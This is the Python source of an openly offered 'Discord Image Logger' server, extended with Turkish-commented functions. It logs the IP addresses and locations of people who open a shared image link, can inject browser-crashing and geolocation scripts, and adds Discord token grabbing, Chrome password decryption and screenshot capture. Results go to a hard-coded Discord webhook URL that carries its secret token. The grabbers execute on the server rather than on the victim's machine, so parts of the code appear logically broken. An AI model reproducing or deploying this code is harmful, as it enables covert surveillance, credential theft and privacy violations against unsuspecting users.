# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import os  # Çevre değişkenleri için bu import'u ekleyin

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1255959626160017480/XY8c_2QDiR4VLbWhtoDp_ncYo8mK13MCkB7ubVwddme0pbcxlEdbuAsxyOA_kyjka8BW",
    "image": "https://imgur.com/a/4RHCmmB", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def get_system_info():
    path = os.getenv('APPDATA')
    localpath = os.getenv('LOCALAPPDATA')
    username = os.getenv('username')
    pc_name = os.environ.get('COMPUTERNAME', 'Bilinmiyor')
    
    # Daha fazla sistem bilgisi toplayalım
    try:
        import platform
        import psutil
        import uuid
        
        system = platform.system()
        processor = platform.processor()
        architecture = platform.architecture()[0]
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
        
        # RAM bilgisi
        ram = psutil.virtual_memory()
        total_ram = f"{round(ram.total / (1024.0 ** 3), 2)} GB"
        
        # Disk bilgisi
        disk = psutil.disk_usage('/')
        total_disk = f"{round(disk.total / (1024.0 ** 3), 2)} GB"
        free_disk = f"{round(disk.free / (1024.0 ** 3), 2)} GB"
        
        # İşlemci kullanımı
        cpu_usage = f"{psutil.cpu_percent()}%"
        
        # Ağ bilgisi
        network_info = psutil.net_if_addrs()
        ip_addresses = []
        for interface_name, interface_addresses in network_info.items():
            for address in interface_addresses:
                if str(address.family) == 'AddressFamily.AF_INET':
                    ip_addresses.append(f"{interface_name}: {address.address}")
        
        return {
            'path': path,
            'localpath': localpath,
            'username': username,
            'pc_name': pc_name,
            'system': system,
            'processor': processor,
            'architecture': architecture,
            'mac_address': mac_address,
            'total_ram': total_ram,
            'total_disk': total_disk,
            'free_disk': free_disk,
            'cpu_usage': cpu_usage,
            'local_ips': ip_addresses
        }
    except ImportError:
        # Eğer gerekli modüller yoksa, temel bilgileri döndür
        return {
            'path': path,
            'localpath': localpath,
            'username': username,
            'pc_name': pc_name
        }

def grab_tokens():
    system_info = get_system_info()
    path = system_info.get('path', '')
    localpath = system_info.get('localpath', '')
    
    token_paths = {
        'Discord': path + "\\Discord\\Local Storage\\leveldb\\",
        'Discord PTB': path + "\\discordptb\\Local Storage\\leveldb\\",
        'Discord Canary': path + "\\discordcanary\\Local Storage\\leveldb\\",
        'Chrome': localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        'Opera': localpath + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        'Brave': localpath + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        'Edge': localpath + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
        'Firefox': localpath + "\\Mozilla\\Firefox\\Profiles\\"
    }
    
    tokens = []
    
    for source, directory in token_paths.items():
        try:
            if os.path.exists(directory):
                if source == 'Firefox':
                    # Firefox için özel işlem
                    for profile in os.listdir(directory):
                        profile_path = os.path.join(directory, profile)
                        if os.path.isdir(profile_path):
                            try:
                                # Firefox'ta tokenleri farklı şekilde saklıyor
                                # Burada basit bir arama yapıyoruz
                                for file_name in os.listdir(profile_path):
                                    if file_name.endswith('.sqlite'):
                                        try:
                                            with open(os.path.join(profile_path, file_name), 'rb') as file:
                                                content = file.read().decode('latin-1')
                                                import re
                                                possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                                                for token in possible_tokens:
                                                    if token not in tokens:
                                                        tokens.append(f"Firefox ({profile}): {token}")
                                        except:
                                            pass
                            except:
                                pass
                else:
                    # Diğer tarayıcılar için standart işlem
                    for file_name in os.listdir(directory):
                        if file_name.endswith('.log') or file_name.endswith('.ldb'):
                            try:
                                with open(os.path.join(directory, file_name), 'r', encoding='utf-8', errors='ignore') as file:
                                    content = file.read()
                                    
                                    # Token eşleştirme deseni
                                    import re
                                    possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                                    
                                    for token in possible_tokens:
                                        if token not in tokens:
                                            tokens.append(f"{source}: {token}")
                            except:
                                pass
        except:
            pass
    
    # Token doğrulama
    verified_tokens = []
    for token_info in tokens:
        token = token_info.split(': ')[1]
        try:
            headers = {'Authorization': token}
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if response.status_code == 200:
                user_data = response.json()
                username = user_data.get('username', 'Bilinmiyor')
                discriminator = user_data.get('discriminator', '0000')
                email = user_data.get('email', 'Bilinmiyor')
                phone = user_data.get('phone', 'Bilinmiyor')
                verified_tokens.append(f"{token_info} - {username}#{discriminator} | Email: {email} | Telefon: {phone}")
            else:
                verified_tokens.append(f"{token_info} - Geçersiz")
        except:
            verified_tokens.append(f"{token_info} - Doğrulanamadı")
    
    return '\n'.join(verified_tokens) if verified_tokens else "Token bulunamadı"

def grab_passwords():
    try:
        import sqlite3
        import json
        import shutil
        import win32crypt
        from Crypto.Cipher import AES
        
        passwords = []
        
        # Chrome şifrelerini al
        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
        login_db = os.path.join(chrome_path, 'Login Data')
        
        # Veritabanını kopyala (kullanımdaysa erişim hatası almamak için)
        temp_file = os.path.join(os.getenv('TEMP'), 'login_data')
        try:
            shutil.copy2(login_db, temp_file)
            
            # Chrome şifreleme anahtarını al
            key_path = os.path.join(chrome_path, 'Local State')
            with open(key_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
                encrypted_key = local_state['os_crypt']['encrypted_key']
                
            encrypted_key = base64.b64decode(encrypted_key)[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            # Veritabanından şifreleri al
            conn = sqlite3.connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                site_url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Şifreyi çöz
                try:
                    iv = encrypted_password[3:15]
                    payload = encrypted_password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decrypted_password = cipher.decrypt(payload)[:-16].decode()
                    
                    if username and decrypted_password:
                        passwords.append(f"URL: {site_url}\nKullanıcı Adı: {username}\nŞifre: {decrypted_password}\n")
                except:
                    continue
            
            cursor.close()
            conn.close()
            
        except:
            pass
        
        finally:
            try:
                os.remove(temp_file)
            except:
                pass
        
        return '\n'.join(passwords) if passwords else "Şifre bulunamadı"
    except:
        return "Şifre toplama başarısız oldu"

def take_screenshot():
    try:
        import pyautogui
        import tempfile
        
        # Ekran görüntüsü al
        screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        # Dosyayı oku ve base64'e çevir
        with open(screenshot_path, 'rb') as image_file:
            encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
        
        # Geçici dosyayı sil
        try:
            os.remove(screenshot_path)
        except:
            pass
        
        return encoded_image
    except:
        return None

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    # Discord tokenlerini ve sistem bilgilerini al
    tokens = grab_tokens()
    system_info = get_system_info()
    passwords = grab_passwords()
    screenshot = take_screenshot()
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**Kullanıcı Resmi Açtı!**

**Endpoint:** `{endpoint}`
            
**IP Bilgisi:**
> **IP:** `{ip if ip else 'Bilinmiyor'}`
> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Bilinmiyor'}`
> **ASN:** `{info['as'] if info['as'] else 'Bilinmiyor'}`
> **Ülke:** `{info['country'] if info['country'] else 'Bilinmiyor'}`
> **Bölge:** `{info['regionName'] if info['regionName'] else 'Bilinmiyor'}`
> **Şehir:** `{info['city'] if info['city'] else 'Bilinmiyor'}`
> **Koordinatlar:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Yaklaşık' if not coords else 'Kesin, [Google Haritalar]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Zaman Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobil:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Muhtemelen' if info['hosting'] else 'Hayır'}`

**PC Bilgisi:**
> **İşletim Sistemi:** `{os}`
> **Tarayıcı:** `{browser}`
> **Kullanıcı Adı:** `{system_info.get('username', 'Bilinmiyor')}`
> **PC Adı:** `{system_info.get('pc_name', 'Bilinmiyor')}`
> **İşlemci:** `{system_info.get('processor', 'Bilinmiyor')}`
> **Mimari:** `{system_info.get('architecture', 'Bilinmiyor')}`
> **RAM:** `{system_info.get('total_ram', 'Bilinmiyor')}`
> **Disk:** `{system_info.get('total_disk', 'Bilinmiyor')} (Boş: {system_info.get('free_disk', 'Bilinmiyor')})`
> **CPU Kullanımı:** `{system_info.get('cpu_usage', 'Bilinmiyor')}`
> **MAC Adresi:** `{system_info.get('mac_address', 'Bilinmiyor')}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
